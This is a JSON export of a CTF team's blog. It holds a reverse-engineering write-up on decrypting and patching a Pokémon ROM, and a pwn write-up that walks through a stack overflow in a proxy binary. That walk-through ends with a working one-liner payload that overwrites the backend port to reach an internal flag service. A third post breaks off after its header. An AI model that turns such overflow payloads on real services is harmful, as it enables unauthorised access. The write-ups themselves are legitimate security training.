{"meta":{"title":"TEAMROCKETIST","subtitle":null,"description":"ctf team teamrocketist","author":"TEAMROCKETIST","url":"https://teamrocketist.github.io"},"pages":[{"title":"404 Not Found","date":"2022-08-23T00:14:55.165Z","updated":"2022-08-23T00:14:55.165Z","comments":false,"path":"/404.html","permalink":"https://teamrocketist.github.io//404.html","excerpt":"","text":""},{"title":"About","date":"2022-08-23T00:14:55.169Z","updated":"2022-08-23T00:14:55.169Z","comments":false,"path":"about/index.html","permalink":"https://teamrocketist.github.io/about/index.html","excerpt":"","text":"Who are we?TeamRocketIST is a security team founded in August of 2017, we represent IST (Instituto Superior Técnico). The main purpose of the team is create a reason to learn/pratice subjects that we may have learned in university but didn’t have the time to pratice them in class. We also aim to create an environment among students in order to motivate them to research new cyber security issues. We like to contribute to the community with high detailed write ups. Our ranking never was our primary concern, and since we are a very small team is very unlikely we will ever get a top 50 in the end of the year. The max number of students we actually had during a ctf was 4, currently we only play with 1/2 max students and we are open to recruit more people. For recruitment or other subjects you can contact us via twitter or via discord rofl#6625"},{"title":"Categories","date":"2022-08-23T00:14:55.169Z","updated":"2022-08-23T00:14:55.169Z","comments":false,"path":"categories/index.html","permalink":"https://teamrocketist.github.io/categories/index.html","excerpt":"","text":""},{"title":"Competitions","date":"2022-08-23T00:14:55.169Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"competitions/index.html","permalink":"https://teamrocketist.github.io/competitions/index.html","excerpt":"","text":""},{"title":"Links","date":"2022-08-23T00:14:55.169Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"links/index.html","permalink":"https://teamrocketist.github.io/links/index.html","excerpt":"","text":""},{"title":"Tags","date":"2022-08-23T00:14:55.169Z","updated":"2022-08-23T00:14:55.169Z","comments":false,"path":"tags/index.html","permalink":"https://teamrocketist.github.io/tags/index.html","excerpt":"","text":""},{"title":"Repository","date":"2022-08-23T00:14:55.169Z","updated":"2022-08-23T00:14:55.169Z","comments":false,"path":"repository/index.html","permalink":"https://teamrocketist.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"[Reverse] WPI CTF 2022 - PokemonRematch","slug":"Reverse-WPI-CTF-2022-PokemonRematch","date":"2022-09-30T03:21:08.838Z","updated":"2022-09-30T06:07:18.042Z","comments":true,"path":"2022/09/30/Reverse-WPI-CTF-2022-PokemonRematch/","link":"","permalink":"https://teamrocketist.github.io/2022/09/30/Reverse-WPI-CTF-2022-PokemonRematch/","excerpt":"","text":"PokemonRematch Solves: ?? Points: ??? Description:Beat the game. 1 flag for beating the game, 2 flags if S.S.Anne doesn’t deport from the dock. Attachment: download41c4dfc1e3e282b2a149b0accdc477ca TLDR Decrypt the rom by reversing the emulator Use Cheat search to find exit map connections address Change the warp location constant to hall of fame room (0x76) IntroductionThe challenge offered two emulators for two operating systems (linux and macos) and a ROM. 12345$ file pokered.gbpokered.gb: data$ file emulator_linuxemulator_linux: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped From the file command, we can actually see that the ROM is weird since it doesn’t detect it as a real GB ROM. For example, a real GBA ROM would output something like this:12file real.gba real.gda: Game Boy ROM image: \"POKEMON RED\" (Rev.00) [SGB] [MBC3+RAM+BATT], ROM: 8Mbit, RAM: 256Kbit From this, we can assume the ROM must be encrypted and the emulator must be decrypting it before loading it. There is a high chance that the author of the challenge didn’t implement an emulator from scratch, so this is probably a modified emulator from an open source project. From the file command file emulator_linux we can see the symbols weren’t stripped, so we can easily identify the functions by their real names. If we search for load, we can see the namespace is FunkyBoy: FunkyBoy is an open source project, and we can take a look at the source code in github. From the challenge description and in the begining when we start a new game professor Oak will tell us that he will give us two flags, one if we beat the game and another one if we beat the game without the boat S.S.Anne departing. We could play the ROM and beat the game, but unfortunately it seems to be pretty hard to do so since the game seems to have been modified to be harder to beat (Brock has 22 level Pokemon). Dumping the ROMI used two methods to dump the ROM, GDB and Frida. GDBWe can use the command dump memory but first we need to find a place to breakpoint and dump the ROM. By looking at the original code of the emulator, we can see the rom is being loaded at the function Memory::loadROM. First it reads the header here and much later it reads the rest here. As we can see here, the ROM raw_bytes are eventually saved in a class variable rom. We could have imported the structures to make IDA/Ghidra code much more readable, but to be honest, it takes some time to fix and import, and the code is not very hard to understand and locate where the encryption is being done. As we can see below, the code shows up right after file reading: We can setup our breakpoint at 0x40d6cf, but before that, we would need to know the size of the ROM. Looking around on github, we can find a place where the ROM size is calculated. We can locate this in IDA/Ghidra by looking for the call to romSizeInBytes: Finally we use GDB to dump from memory: 1234567891011pwngdb&gt; b *0x40d6cfpwngdb&gt; b *0x40D598pwngdb&gt; r pokered.gbBreakpoint 2, 0x000000000040d598 in FunkyBoy::Memory::loadROM(std::istream&amp;, bool) ()► 0x40d598 mov eax, eaxpwngdb&gt; p/x $rax$1 = 0x100000pwngdb&gt; cBreakpoint 1, 0x000000000040d6cf in FunkyBoy::Memory::loadROM(std::istream&amp;, bool) ()► 0x40d6cf movzx eax, byte ptr [r13 + 0x149]pwngdb&gt; dump memory dump_gdb.gba $r13 $r13+0x100000 Checking the signature: 12$ file dump_gdb.gbadump.gda: Game Boy ROM image: \"POKEMON RED\" (Rev.00) [SGB] [MBC3+RAM+BATT], ROM: 8Mbit, RAM: 256Kbit FridaWe can also use a very cool project named frida. This can be easily installed with the following commands:12$ pip install frida$ pip install frida-tools This project makes it very easy to hook functions, and there is a very good function to hook and get the pointer of the ROM variable. The most interesting thing about Frida is that we can easily use JavaScript to modify the behaviour when a certain function is called or even call other functions inside of it. Here is an example how we could dump the file using frida:123456789101112131415161718var romSizeInBytes_ptr = 0x4126A0; //ghidravar getROMHeader_ptr = 0x40DFC0; //ghidravar romSize_offset = 0x0148; // https://github.com/kremi151/FunkyBoy/blob/74bdcaf8b876d18293ba833d977a5892c9ef65d7/core/source/cartridge/header.h#L39Interceptor.attach(ptr(getROMHeader_ptr), &#123; onEnter: function(args) &#123;&#125;, onLeave: function(retval) &#123; var fd = new File(\"dump.gda\", \"wb\"); var romSizeInBytes = new NativeFunction(ptr(romSizeInBytes_ptr), 'uint32', ['uint8']); var romSize = retval.add(romSize_offset).readU8(); var realRomSize = romSizeInBytes(romSize); if (fd &amp;&amp; fd != null) &#123; fd.write(Memory.readByteArray(retval, realRomSize)); fd.flush(); fd.close(); &#125; &#125;&#125;); To run frida we can use the following command:1$ frida -l hook.js -f ./emulator_linux pokered.gb --no-pause Getting to the hall of fameNow that we dumped the file, we can use other emulators to debug the ROM. To exploit the game, my theory was to find the offset of the warp_location when the player enters a door or switches to a new map and change it to the Hall of Fame room. The bgb emulator is excellent because it has a memory searcher similar to Cheat Engine and also a debugger: 1$ wine bgb.exe dump.gda I used the cheat memory searcher to find the offset required. First I clicked on start (we get all the addresses listed in the window): So if we exit the door, we will be teleported to another map. It’s logical to assume that the value stored in the offset where the connections between the maps will change. After we exit the map, we can select the check box not -&gt; equal to-&gt; search With this, we can see we eliminated 40k possibilities: Then I decided to reenter the room and try the same method with not -&gt; equal to -&gt; the previous value -&gt; search but the number of addresses reduced was very low. So instead I decided to move around the room and use multiple not -&gt; above to -&gt; the previous value -&gt; search and not -&gt; below -&gt; the previous value -&gt; search and I got as far as 1000 addresses: Following this, I noticed that there were a lot of 0A and 0B addresses in memory. I decided to risk it and remove them with not -&gt; equal to -&gt; this value: 0A -&gt; search and not -&gt; equal to -&gt; this value: 0B -&gt; search. With this, I was able to reduce it to 100 addresses: It becomes difficult to reduce it further from here… So I searched in bubblepedia on possible warp_location values, and I found the one that could lead me to the blue house: The constant for Blue’s house is 39. Converting to hexadecimal, we get 0x27. Exiting the house and going near Blue’s house, we can use the filter equal to -&gt; this value: 27 -&gt; search: We are left with two offsets, D3B6 and D73C by choosing to modify the first address to 2A (Poké Mart (Viridian City) ): We are teleported to the Poké Mart after entering the door: Now that we know how to teleport, we must first leave the pokemart and return to the blues’ house door. Then we need to figure out what the constant is for the Hall of Fame. I saw on bubblepedia that the Hall of Fame constant is 118: By changing the constant to 118 -&gt; 0x76, we finally get teleported to the final room of the game and win: The flags were FatPika:IsBEST! and GottaCaTcH!em","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"emulator","slug":"emulator","permalink":"https://teamrocketist.github.io/tags/emulator/"},{"name":"gdb","slug":"gdb","permalink":"https://teamrocketist.github.io/tags/gdb/"},{"name":"gba_rom","slug":"gba-rom","permalink":"https://teamrocketist.github.io/tags/gba-rom/"},{"name":"frida","slug":"frida","permalink":"https://teamrocketist.github.io/tags/frida/"}]},{"title":"[Pwn] BalsnCTF2022 - Flag Market 1","slug":"Pwn-BalsnCTF2022-Flag-Market-1","date":"2022-09-06T04:05:52.000Z","updated":"2022-09-30T04:29:29.166Z","comments":true,"path":"2022/09/06/Pwn-BalsnCTF2022-Flag-Market-1/","link":"","permalink":"https://teamrocketist.github.io/2022/09/06/Pwn-BalsnCTF2022-Flag-Market-1/","excerpt":"","text":"Flag Market 1 Solves: 43 Points: 175 Description:Do you love flags? Try to buy some! nc flag-market-us.balsnctf.com 19091 or nc flag-market-sin.balsnctf.com 19091 or nc flag-market-uk.balsnctf.com 19091 Attachment: download234b79b0adee52c9402019214038dce9 TLDR Overflow port 31337 to obtain SSRF in the listening xinetd service. Challenge designThis challenge is split in 3 parts. The first part is a simple buffer overflow. We must understand how the services are working. We can view the attachment: 12345678910111213141516171819202122232425$ unzip -l 234b79b0adee52c9402019214038dce9.zipArchive: 234b79b0adee52c9402019214038dce9.zip Length Date Time Name--------- ---------- ----- ---- 0 2022-08-30 16:11 flag_market/ 253 2022-08-30 15:01 flag_market/deploy.sh 506 2022-08-30 14:52 flag_market/backend.Dockerfile 32 2022-08-30 15:01 flag_market/README.md 409 2022-08-30 14:52 flag_market/docker-compose-backend.yml 381 2022-08-30 14:52 flag_market/docker-compose-chal.yml 325 2022-08-30 14:52 flag_market/xinetd-flag1 1048 2022-08-30 14:52 flag_market/flag_market.Dockerfile 0 2022-08-31 16:52 flag_market/src/ 512 2022-08-30 14:55 flag_market/src/patch.diff 123 2022-08-31 15:55 flag_market/src/run.sh 336 2022-08-30 14:55 flag_market/src/Makefile 22768 2022-08-30 14:55 flag_market/src/flag_market 0 2022-08-30 14:55 flag_market/src/backend/ 1419 2022-08-30 14:54 flag_market/src/backend/backend.py 25 2022-08-30 14:54 flag_market/src/backend/run_flag1.sh 79 2022-08-30 14:54 flag_market/src/backend/run_backend.sh 9819 2022-08-30 14:55 flag_market/src/flag_market.c 13 2022-08-30 14:56 flag_market/src/flag3--------- ------- 38048 19 files To study how the service works, we must review the deploy.sh and docker-compose yml files. deploy.sh is simply building and running the docker instances and initiating the services: 12345678$ cat deploy.sh #!/bin/bashdocker-compose -f ./docker-compose-backend.yml buildCHAL_PORT=13337 docker-compose -f ./docker-compose-chal.yml builddocker-compose -f ./docker-compose-backend.yml up -dCHAL_PORT=13337 docker-compose -f ./docker-compose-chal.yml up -d Deploy.sh is already hinting which port will be exposed to the host. docker-compose-backend.yml seems to have the hostname as backend and the flags are stored in environment variables of the container: 123456789101112131415161718version: \"3.5\"services: backend: build: context: ./ dockerfile: backend.Dockerfile restart: always hostname: backend environment: - FLAG1=BALSN&#123;FLAG1&#125; - FLAG2=BALSN&#123;FLAG2&#125; networks: - networknetworks: network: name: flag_market_network# docker-compose -f ./docker-compose-backend.yml up -d Checking the backend.Dockerfile we see that the flag1 will probably be printed in the xinetd service: 1234567891011121314FROM ubuntu:20.04MAINTAINER how2hackRUN apt-get update --fix-missingRUN apt-get upgrade -yRUN apt-get install -y xinetdRUN DEBIAN_FRONTEND=noninteractive apt-get install -y python3 python3-pipRUN pip install -U pip flask setuptools gunicornRUN useradd -m backendCOPY src/backend/backend.py /backend/COPY src/backend/run_flag1.sh /backend/COPY src/backend/run_backend.sh /backend/COPY ./xinetd-flag1 /etc/xinetd.d/xinetd-flag1USER backendCMD /usr/sbin/xinetd -dontfork &amp; /backend/run_backend.sh We can tell from the xinetd file that the daemon’s service will be run on port 31337: 1234567891011121314151617$ cat xinetd-flag1 service backend-flag1&#123; disable = no type = UNLISTED wait = no server = /backend/run_flag1.sh socket_type = stream protocol = tcp user = backend port = 31337 flags = IPv4 REUSE per_source = 5 rlimit_cpu = 3 rlimit_as = 64M nice = 18&#125; Reading run_flag1.sh we know it will print the flag: 1234$ cat src/backend/run_flag1.sh#!/bin/bashecho $FLAG1 Another thing we know from the dockerfile is that another service must be running here as well, as we can see in src/backend/run_backend.sh. The file will be running a Flask server on Guicorn:1234#!/bin/bashcd /backendgunicorn -w 4 \"backend:create_app()\" -b 0.0.0.0:29092 --error-logfile /tmp/error.log --access-logfile /tmp/access.log --capture-output --log-level debug This service is related to part two, so we won’t talk much about it in this write-up. The important part here is knowing that this service is running in backend:29092 and is not accessible to the host, at least from the information we have right now. Let’s see the other container, docker-compose-chal.yml. 12345678910111213141516cat docker-compose-chal.yml version: \"3.5\"services: flag_market: build: context: ./ dockerfile: flag_market.Dockerfile ports: - \"$&#123;CHAL_PORT&#125;:19091/tcp\" networks: - flag_market_networknetworks: flag_market_network: external: true# CHAL_PORT=13337 docker-compose -f ./docker-compose-chal.yml -p flag_market_13337 up -d Exposes port 19091 to the host and links it to the port passed in the ENV variable CHAL_PORT which will be 13337 if we choose so or run the deploy.sh script. The file flag_market.Dockerfile will show it’s copying an elf executable and moving it to /home/flag_market and running a sh script named run.sh: 123456789101112131415161718192021222324252627282930FROM ubuntu:20.04MAINTAINER how2hackRUN apt-get update --fix-missingRUN apt-get upgrade -yRUN apt-get install -y xinetdRUN DEBIAN_FRONTEND=noninteractive apt-get install -y git libtool pkg-config make python3 python3-pip help2manRUN pip install -U pip pycryptoRUN useradd -m flag_marketWORKDIR /home/flag_marketRUN git clone https://github.com/frankmorgner/vsmartcard.gitWORKDIR /home/flag_market/vsmartcardRUN git checkout 8b4aa3e7bfe891d986237759576b5ebf0e4ed42bCOPY src/patch.diff /home/flag_market/vsmartcard/RUN git apply patch.diffWORKDIR /home/flag_market/vsmartcard/virtualsmartcardRUN autoreconf --verbose --installRUN ./configure --sysconfdir=/etc --enable-libpcscliteRUN makeRUN make installCOPY src/flag_market /home/flag_market/COPY src/run.sh /home/flag_market/COPY src/flag3 /home/flag_market/RUN chmod 774 /tmpRUN chmod -R 774 /var/tmpRUN chmod -R 774 /devRUN chmod -R 774 /runRUN chmod 1733 /tmp /var/tmp /dev/shmRUN chown -R root:root /home/flag_marketUSER flag_marketCMD [\"/home/flag_market/run.sh\"] The src/run.sh file will start the ELF while preloading a special library:123456$ cat src/run.sh#!/bin/bashexport LD_PRELOAD=/usr/local/lib/libpcsclite.so.1exec 2&gt;/dev/nulltimeout 1800 /home/flag_market/flag_market The organizers were nice enough to provide us with the source code, so let’s analyse what this binary contains. Socket is listening on port 19091 123456789101112131415161718192021222324252627282930313233343536...#define HOST \"127.0.0.1\"#define PORT 19091#define BK_HOST \"backend\"#define BK_PORT 29092...int main(void)&#123; int server_fd; int accepted_client_fd; struct sockaddr_in serverInfo; struct sockaddr_in clientInfo; socklen_t optval = 1; pid_t pid[50]; int pid_n = 0; server_fd = socket(AF_INET, SOCK_STREAM, 0); if (server_fd &lt; 0) exit(-1); if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (void *)&amp;optval, sizeof(optval)) != 0) exit(-1); int addrlen = sizeof(clientInfo); bzero(&amp;serverInfo, sizeof(serverInfo)); serverInfo.sin_family = PF_INET; serverInfo.sin_addr.s_addr = INADDR_ANY; serverInfo.sin_port = htons(PORT); if (bind(server_fd, (struct sockaddr*)&amp;serverInfo, sizeof(serverInfo)) &lt; 0) exit(-1); if (listen(server_fd, NUM_PID) &lt; 0) exit(-1); ... And will send the received data to the previously seen backend: 29092 flask webserver: 1234567891011121314151617181920212223242526272829oid connection_handler(int sock_fd)&#123; char request[MAX_REQ_BUF] = &#123;&#125;; char method[MAX_BUF] = &#123;&#125;; char path[MAX_BUF] = &#123;&#125;; char port[MAX_BUF] = &#123;&#125;; char host[MAX_BUF] = &#123;&#125;; size_t n = 0; size_t reqLen = 0; connection_sock = sock_fd; signal(SIGALRM, exception_handler); signal(SIGABRT, exception_handler); alarm(TIMEOUT); snprintf(host, MAX_BUF, \"%s\", BK_HOST); snprintf(port, MAX_BUF, \"%d\", BK_PORT); reqLen = read_input(sock_fd, request, MAX_REQ_BUF); n = sscanf(request, \"%s /%s HTTP/1.1\", method, path); if (n != 2) snprintf(path, MAX_BUF, \"500\"); route(sock_fd, host, port, method, path, reqLen, request); close(sock_fd); exit(0);&#125; The request flow can be simplified by using the following drawing:1[Host]localhost:13337 -&gt; [flag_market]127.0.0.1:19091 -&gt; [backend]backend:29092 GdbserverBefore starting to search for a vulnerability, we might want to find a strategy for how we would debug the binary for every payload we send. We can use remote debugging; for this, we either copy an already-compiled version of gdbserver or we install it on the Docker server. Because I chose to install gdbserver in Docker, we needed to first expose an extra port (1337) for gdb to connect to. We can do this by modifying the docker-compose-chall.yml file: 12345678910111213141516version: \"3.5\"services: flag_market: build: context: ./ dockerfile: flag_market.Dockerfile ports: - \"$&#123;CHAL_PORT&#125;:19091/tcp\" - \"1337:1337/tcp\" # changed line networks: - flag_market_networknetworks: flag_market_network: external: true# CHAL_PORT=13337 docker-compose -f ./docker-compose-chal.yml -p flag_market_13337 up -d We could now either modify the Docker files to start the gdbserver automatically after the binary is run, or run commands after the instance is running. I didn’t want to break anything or make the server slightly different from the server version, so to save time, after setting up the servers with ./deploy.sh, I just ran the following commands to install gdb: 12345$ sudo docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7e3450cc8dad flag_market_flag_market \"/home/flag_market/r…\" 10 hours ago Up 10 minutes 0.0.0.0:1337-&gt;1337/tcp, :::1337-&gt;1337/tcp, 0.0.0.0:13337-&gt;19091/tcp, :::13337-&gt;19091/tcp flag_market_flag_market_15ab9319711a0 flag_market_backend \"/bin/sh -c '/usr/sb…\" 2 days ago Up 2 days $ sudo docker exec -it --workdir /root --user root flag_market_flag_market_1 sh -c \"apt update &amp;&amp; apt install gdbserver\" After this we can attach the gdbserver with:12345678910$ sudo docker exec -it flag_market_flag_market_1 ps -auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDflag_ma+ 1 0.0 0.0 3984 2812 ? Ss 05:17 0:00 /bin/bash /hoflag_ma+ 7 0.0 0.0 2748 652 ? S 05:17 0:00 timeout 1800 flag_ma+ 8 0.0 0.0 2416 536 ? S 05:17 0:00 /home/flag_maflag_ma+ 15 0.0 0.0 5900 2888 pts/0 Rs+ 05:29 0:00 ps -aux $ sudo docker exec -it flag_market_flag_market_1 \\sh -c \"gdbserver :1337 --attach \\$(ps -aux | grep ':00 /home/flag_market/flag_market' | head -n 1 | awk '&#123;print \\$2&#125;')\"Attached; pid = 8Listening on port 1337 To attach with gdb from the host we can do this:123pwndbg&gt; target remote :1337...pwndbg&gt; n ExploitSince we don’t care right now about the flask server, ideally we would love to make the binary connect to the xinetd service to get the flag1. But to achieve this, we need to use an overflow. We can find one in the sscanf:1n = sscanf(request, \"%s /%s HTTP/1.1\", method, path); To overflow the port, we need to find the offset to the variable. One of the methods we could use is just trial and error (quite slow), but in my case I chose to use De Bruijn patterns: 12$ ragg2 -P 2000 -rAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAEsAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFkAFlAFmAFnAFoAFpAFqAFrAFsAFtAFuAFvAFwAFxAFyAFzAF1AF2AF3AF4AF5AF6AF7AF8AF9AF0AGBAGCAGDAGEAGFAGGAGHAGIAGJAGKAGLAGMAGNAGOAGPAGQAGRAGSAGTAGUAGVAGWAGXAGYAGZAGaAGbAGcAGdAGeAGfAGgAGhAGiAGjAGkAGlAGmAGnAGoAGpAGqAGrAGsAGtAGuAGvAGwAGxAGyAGzAG1AG2AG3AG4AG5AG6AG7AG8AG9AG0AHBAHCAHDAHEAHFAHGAHHAHIAHJAHKAHLAHMAHNAHOAHPAHQAHRAHSAHTAHUAHVAHWAHXAHYAHZAHaAHbAHcAHdAHeAHfAHgAHhAHiAHjAHkAHlAHmAHnAHoAHpAHqAHrAHsAHtAHuAHvAHwAHxAHyAHzAH1AH2AH3AH4AH5AH6AH7AH8AH9AH0AIBAICAIDAIEAIFAIGAIHAIIAIJAIKAILAIMAINAIOAIPAIQAIRAISAITAIUAIVAIWAIXAIYAIZAIaAIbAIcAIdAIeAIfAIgAIhAIiAIjAIkAIlAImAInAIoAIpAIqAIrAIsAItAIuAIvAIwAIxAIyAIzAI1AI2AI3AI4AI5AI6AI7AI8AI9AI0AJBAJCAJDAJEAJFAJGAJHAJIAJJAJKAJLAJMAJNAJOAJPAJQAJRAJSAJTAJUAJVAJWAJXAJYAJZAJaAJbAJcAJdAJeAJfAJgAJhAJiAJjAJkAJlAJmAJnAJoAJpAJqAJrAJsAJtAJuAJvAJwAJxAJyAJzAJ1AJ2AJ3AJ4AJ5AJ6AJ7AJ8AJ9AJ0AKBAKCAKDAKEAKFAKGAKHAKIAKJAKKAKLAKMAKNAKOAKPAKQAKRAKSAKTAKUAKVAKWAKXAKYAKZAKaAKbAKcAKdAKeAKfAKgAKhAKiAKjAKkAKlAKmAKnAKoAKpAKqAKrAKsAKtAKuAKvAKwAKxAKyAKzAK1AK2AK3AK4AK5A We then send this to the server: 1234567891011121314151617181920212223242526echo 'AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYA'\\'AZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAA'\\'zAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQ'\\'ABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqA'\\'BrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHAC'\\'IACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACi'\\'ACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9A'\\'C0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZAD'\\'aADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1'\\'AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERA'\\'ESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAE'\\'sAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJ'\\'AFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjA'\\'FkAFlAFmAFnAFoAFpAFqAFrAFsAFtAFuAFvAFwAFxAFyAFzAF1AF2AF3AF4AF5AF6AF7AF8AF9AF0AG'\\'BAGCAGDAGEAGFAGGAGHAGIAGJAGKAGLAGMAGNAGOAGPAGQAGRAGSAGTAGUAGVAGWAGXAGYAGZAGaAGb'\\'AGcAGdAGeAGfAGgAGhAGiAGjAGkAGlAGmAGnAGoAGpAGqAGrAGsAGtAGuAGvAGwAGxAGyAGzAG1AG2A'\\'G3AG4AG5AG6AG7AG8AG9AG0AHBAHCAHDAHEAHFAHGAHHAHIAHJAHKAHLAHMAHNAHOAHPAHQAHRAHSAH'\\'TAHUAHVAHWAHXAHYAHZAHaAHbAHcAHdAHeAHfAHgAHhAHiAHjAHkAHlAHmAHnAHoAHpAHqAHrAHsAHt'\\'AHuAHvAHwAHxAHyAHzAH1AH2AH3AH4AH5AH6AH7AH8AH9AH0AIBAICAIDAIEAIFAIGAIHAIIAIJAIKA'\\'ILAIMAINAIOAIPAIQAIRAISAITAIUAIVAIWAIXAIYAIZAIaAIbAIcAIdAIeAIfAIgAIhAIiAIjAIkAI'\\'lAImAInAIoAIpAIqAIrAIsAItAIuAIvAIwAIxAIyAIzAI1AI2AI3AI4AI5AI6AI7AI8AI9AI0AJBAJC'\\'AJDAJEAJFAJGAJHAJIAJJAJKAJLAJMAJNAJOAJPAJQAJRAJSAJTAJUAJVAJWAJXAJYAJZAJaAJbAJcA'\\'JdAJeAJfAJgAJhAJiAJjAJkAJlAJmAJnAJoAJpAJqAJrAJsAJtAJuAJvAJwAJxAJyAJzAJ1AJ2AJ3AJ'\\'4AJ5AJ6AJ7AJ8AJ9AJ0AKBAKCAKDAKEAKFAKGAKHAKIAKJAKKAKLAKMAKNAKOAKPAKQAKRAKSAKTAKU'\\'AKVAKWAKXAKYAKZAKaAKbAKcAKdAKeAKfAKgAKhAKiAKjAKkAKlAKmAKnAKoAKpAKqAKrAKsAKtAKuA'\\'KvAKwAKxAKyAKzAK1AK2AK3AK4AK5A' | nc localhost 13337 The binary is using alarm to terminate the child process after 5 seconds. This will give us a very short time to use gdb. To circumvent this. I just setup a breakpoint in alarm and modified the RDI register value (first parameter) to a higher value. 12345678910111213141516171819pwndbg&gt; ni 7 # get past fork...pwndbg&gt; b alarm...pwndbg&gt; b *route+1152...pwndbg&gt; c...pwndbg&gt; set $rdi = 0x1000000...pwndbg&gt; c 0x556a06e37205 &lt;route+1149&gt; mov rdi, rax ► 0x556a06e37208 &lt;route+1152&gt; call connect_backend &lt;connect_backend&gt; rdi: 0x7ffca57904c0 ◂— 0x646e656b636162 /* 'backend' */ rsi: 0x7ffca5790340 ◂— 0x414f45414e45414d ('MAENAEOA') rdx: 0x7ffca578ffe0 —▸ 0x556a076d72a0 ◂— 0x4143414142414141 ('AAABAACA') rcx: 0x7ffca578ffe8 ◂— 0x3ff 0x556a06e3720d &lt;route+1157&gt; mov rdx, qword ptr [rbp - 0x18] 1void connect_backend(char *host, char *port, char **data, size_t *dataLen); Port will be in the second argument, $RSI and we can see the De Bruijn value 0x414f45414e45414d. We can use r2 to calculate this offset: 123r2 src/flag_market[0x00001460]&gt; wopO 0x414f45414e45414d768 The offset needed is 768 so we can do a oneliner to get the flag in the server (the port needs to be in this format, 31331 as a string due to the fact the binary uses atoi): 12$ python -c \"print('A'*768+'31337')\" | nc flag-market-us.balsnctf.com 26790BALSN&#123;5sRf_1n_b!n4ry?!?!6589621de02ead8cae80fa4e6d0f905e&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"gdbserver","slug":"gdbserver","permalink":"https://teamrocketist.github.io/tags/gdbserver/"},{"name":"docker","slug":"docker","permalink":"https://teamrocketist.github.io/tags/docker/"}]},{"title":"[Pwn] WMCTF2022 - WM Baby Droid","slug":"Pwn-WMCTF2022-WM-Baby-Droid","date":"2022-08-23T01:05:21.345Z","updated":"2022-08-24T10:13:45.896Z","comments":true,"path":"2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/","link":"","permalink":"https://teamrocketist.github.io/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/","excerpt":"","text":"WM Baby Droid Solves: 1 Points: 500 Description:nc 43.248.96.7 10086 Attachment: 